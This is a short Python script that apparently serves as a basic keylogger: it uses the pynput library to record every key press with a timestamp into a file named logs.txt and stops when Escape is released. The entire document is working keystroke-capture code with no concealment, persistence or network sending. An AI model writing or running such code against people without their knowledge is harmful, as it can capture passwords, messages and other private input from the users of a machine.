from pynput.keyboard import Listener, Key
from datetime import datetime

def writeToFile(key):
    keyData = str(key)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") 
    with open("logs.txt", "a") as file:
        file.write(f"{timestamp}: {keyData}\n")

def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press=writeToFile, on_release=onRelease) as myListener:
    myListener.join()
